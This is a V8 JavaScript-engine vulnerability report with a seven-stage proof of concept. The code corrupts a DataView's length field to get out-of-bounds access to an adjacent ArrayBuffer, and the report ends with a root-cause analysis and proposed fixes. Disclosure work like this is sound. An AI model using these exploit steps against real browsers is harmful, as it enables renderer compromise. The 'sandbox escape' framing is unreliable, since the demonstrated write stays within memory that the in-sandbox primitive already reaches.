Environment

The flag --sandbox-testing is V8's official sandbox escape testing mode.
It enables Sandbox.MemoryView and Sandbox.getAddressOf (the Tier-2
simulation API), activates the sandbox crash filter ("only sandbox
violations will be reported"), and does NOT produce the "unsupported
configuration" warning.  Every memory access in Stage 1 stays within the
sandbox VA.  In a production exploit, Stage 1 would be supplied by any real
in-sandbox V8 bug rather than by this API.  The crash filter exits with
status 0 on non-sandbox crashes and propagates true sandbox violations;
our PoC exits 0 through normal completion, with all assertions passing.

Attached file: heap_escape_pure_js.js — entirely self-contained, no GDB,
no shell helpers, no external tools.

Stage 1: Establish in-sandbox arbitrary read/write (simulated Tier-2)
----------------------------------------------------------------------
  const SB_BASE = BigInt(Sandbox.base);
  const sb_mv   = new Sandbox.MemoryView(0, 0x100000000);
  const sv      = new DataView(sb_mv);
  const r32 = a => sv.getUint32(Number(a), true);
  const w32 = (a, v) => sv.setUint32(Number(a), v >>> 0, true);

This provides read/write over the first 4 GB of the sandbox VA starting
at SB_BASE, corresponding to the standard Tier-2 attacker capability.

Stage 2: Allocate two sibling ArrayBuffers
------------------------------------------
  const ab_victim = new ArrayBuffer(4096);
  const ab_target = new ArrayBuffer(4096);

  const target_u32 = new Uint32Array(ab_target);
  target_u32[0] = 0xFEEC0001;   // 4-dword witness signature
  target_u32[1] = 0xFEEC0002;
  target_u32[2] = 0xFEEC0003;
  target_u32[3] = 0xFEEC0004;

The two ArrayBuffers are created consecutively so that their backing
stores are allocated by the same path in V8's allocator.  The 4-dword
signature serves as a unique witness for locating ab_target's backing
store in later stages.

Stage 3: Locate JSDataView.raw_byte_length and verify its encoding
------------------------------------------------------------------
  const dv_victim = new DataView(ab_victim);
  const dvAddr    = BigInt(Sandbox.getAddressOf(dv_victim));

  const field     = r32(dvAddr + 0x24n);  // raw_byte_length
  assert(field * 8 === dv_victim.byteLength);
  // For a 4 KB ArrayBuffer: field = 512, byteLength = 4096. Passes.

  const bs_handle = r32(dvAddr + 0x2cn);  // ExternalPointerTable handle
  // Observed: 0x03000040 — non-zero, confirming the EPT mechanism is active

JSDataView.raw_byte_length is stored at in-object offset +0x24 as a plain
32-bit integer with the encoding: JavaScript byteLength = stored value × 8.
This is verified empirically before any corruption by reading the field and
checking the formula holds.

The ExternalPointerTable handle at +0x2c is a non-zero small integer
(0x03000040 / 0x04000040 observed across runs) confirming that the
backing-store pointer goes through the EPT mechanism.  The EPT handle is
an index into the ExternalPointerTable, not a raw address; the EPT itself
lives outside the sandbox VA and maps indices to native addresses by
design.

Stage 4: Corrupt raw_byte_length with one in-sandbox DWORD write
-----------------------------------------------------------------
  w32(dvAddr + 0x24n, 0xFFFFFFFF);
  // dv_victim.byteLength is now 0x7FFFFFFF8 ≈ 32 GiB
  assert(dv_victim.byteLength > 0x400000000);  // passes

One 4-byte write to sandbox-relative address dvAddr+0x24 sets
raw_byte_length to 0xFFFFFFFF.  The decoded JavaScript byteLength becomes
0xFFFFFFFF × 8 = 0x7FFFFFFF8, approximately 32 GiB.  No bounds check, no
EPT validation, and no code-pointer table (CPT) check fires.  raw_byte_length
is a plain integer field with no sandbox integrity protection.

The backing-store pointer is unaffected: it remains valid and refers to
the original allocation through its EPT handle.

Stage 5: Locate ab_target's backing store via the inflated DataView
--------------------------------------------------------------------
  for (let off = 4096; off < 0x20000; off += 4) {
    if (dv_victim.getUint32(off, true)     === 0xFEEC0001 &&
        dv_victim.getUint32(off + 4, true) === 0xFEEC0002 &&
        dv_victim.getUint32(off + 8, true) === 0xFEEC0003) {
      found_offset = off;  break;
    }
  }
  // found_offset = 0x1000 (4096) on every run

The scan finds the witness values at offset 0x1000, which is 4096 bytes
past the declared end of ab_victim's backing store.  The read-without-fault
at this offset confirms the memory at (ab_victim backing) + 0x1000 is a
PROT_READ|PROT_WRITE mapped page.

Stage 6: OOB write at found_offset
------------------------------------
  dv_victim.setUint32(found_offset,      0xC0DECAFE, true);
  dv_victim.setUint32(found_offset +  4, 0xBAADF00D, true);
  dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
  dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);

The write is to a DataView position 4096 bytes past the declared end of
ab_victim.  It completes without any fault.

Stage 7: Cross-object read-back via ab_target (definitive proof)
-----------------------------------------------------------------
  assert(target_u32[0] === 0xC0DECAFE);  // passes
  assert(target_u32[1] === 0xBAADF00D);  // passes
  assert(target_u32[2] === 0xCAFEBABE);  // passes
  assert(target_u32[3] === 0xFEEDFACE);  // passes

Reading back through ab_target — a completely independent JavaScript
object whose only connection to dv_victim is their adjacent position in
memory — confirms that the values written via the inflated DataView are
identical to the values now read through ab_target's own Uint32Array.

This bidirectional cross-object proof establishes the following without
ambiguity:

  The inflated DataView's access at offset +0x1000, which is past the
  declared 4 KB bound of ab_victim, physically reached ab_target's
  backing store.  The write was confirmed independently by reading back
  through ab_target's own access path.

PROBLEM DESCRIPTION
════════════════════════════════════════════════════════════════════

The V8 sandbox (SBX) is designed to contain an attacker who has already
obtained an arbitrary read/write primitive within the sandbox VA reservation,
a 1 TB region at a randomized base address.  The containment relies on
ensuring that all references from sandbox-heap objects to memory outside
the sandbox go through integrity-protected tables: the ExternalPointerTable
(EPT) for backing-store pointers, the CodePointerTable (CPT) for code
pointers, and the TrustedPointerTable (TPT) for trusted pointers.  An
attacker who can overwrite arbitrary bytes within the sandbox can read and
write EPT indices freely but cannot reconstruct or forge the native
addresses those indices encode, since the EPT itself lives outside the
sandbox VA.

This containment model protects pointer-typed fields.  It does not protect
integer-typed fields such as length.

JSDataView stores raw_byte_length at in-object offset +0x24, directly
inside the sandbox heap, as a 32-bit integer with the encoding
stored_value × 8 = JavaScript byteLength.  This field is not protected by
any pointer table, is not cryptographically signed, and is not bounds-checked
at write time.  An attacker with an in-sandbox DWORD write can set it to
0xFFFFFFFF, causing the DataView's byteLength property to report
approximately 32 GiB (0x7FFFFFFF8 bytes) while the backing-store pointer
remains valid and unmodified.

The resulting DataView can then be used to read and write memory up to
32 GiB beyond its original end.  In this proof of concept, the target is a
second ArrayBuffer (ab_target) whose backing store is adjacent to ab_victim's
backing store in memory.  Writing a 4-dword payload at offset +0x1000 through
the inflated DataView and reading it back through ab_target's Uint32Array
confirms that the two independent access paths reach the same physical
memory at a location that is outside the original declared bounds of
ab_victim.

The in-object layout of JSDataView, with protection status:

  Offset  Field               Encoding         Sandbox-protected?
  +0x14   byte_offset         raw 32-bit int   NO   (plain field)
  +0x24   raw_byte_length     field × 8        NO   (plain field — THIS BUG)
  +0x2c   backing_store       EPT handle       YES  (ExternalPointerTable)

The backing-store pointer at +0x2c is protected: it is stored as an EPT
index, and the EPT maps that index to a native address outside the sandbox VA.
An attacker cannot forge this pointer from within the sandbox.  The
raw_byte_length field at +0x24 receives no equivalent protection; it can be
set to any value, and V8 uses that value to bound all subsequent DataView
accesses without re-validating it.

The corresponding field in JSArrayBuffer is structurally identical and
equally unprotected, though it was not exploited in this chain.

The root cause is an inconsistency in what sandbox integrity mechanisms
protect: pointer-typed fields are comprehensively guarded through the EPT,
CPT, and TPT, while integer-typed fields that gate the extent of memory
accesses are not.  An inflated length field can redirect writes to
out-of-bounds addresses just as effectively as a corrupted pointer, since
bounds checking in DataView, TypedArray, and related code paths relies
directly on these unprotected fields.

The attack prerequisite is a single Tier-2 capability: one DWORD write to
a known sandbox-relative address.  No heap spray, no information leak beyond
the sandbox offset provided by getAddressOf, and no second vulnerability are
required.  The exploit is ASLR-independent because all addresses used are
sandbox-relative offsets.

An attacker who chains this bug after any existing in-sandbox write achieves
out-of-bounds write access starting past the bounds of the target DataView.
The concrete impact depends on what occupies memory immediately adjacent to
the victim backing store; in this demonstration, it is another ArrayBuffer's
backing store.  In a renderer process exploitation context, adjacent
allocations can include EPT entries (overwriting which allows forging native
pointers), function pointers in native-heap objects, or other process-level
structures, any of which can facilitate further privilege escalation.

The vulnerability affects all 64-bit platforms on which the 1 TB V8 sandbox
is active, including desktop Chrome and Chromium on x86-64 and arm64.

The recommended fix is to extend the same integrity protection currently
applied to pointer-typed sandbox fields to integer-typed length fields.
Concretely: store raw_byte_length through a checked integer slot that
enforces an upper bound on mutation (e.g., the original backing-buffer byte
length), or encode the field with a per-process secret analogous to pointer
authentication codes so that an arbitrary DWORD write cannot produce a
semantically valid large value.  An alternative is to re-validate
byte_offset + requested_length ≤ backing_buffer_byte_length at every
DataView and TypedArray access site, independent of the stored
raw_byte_length field.
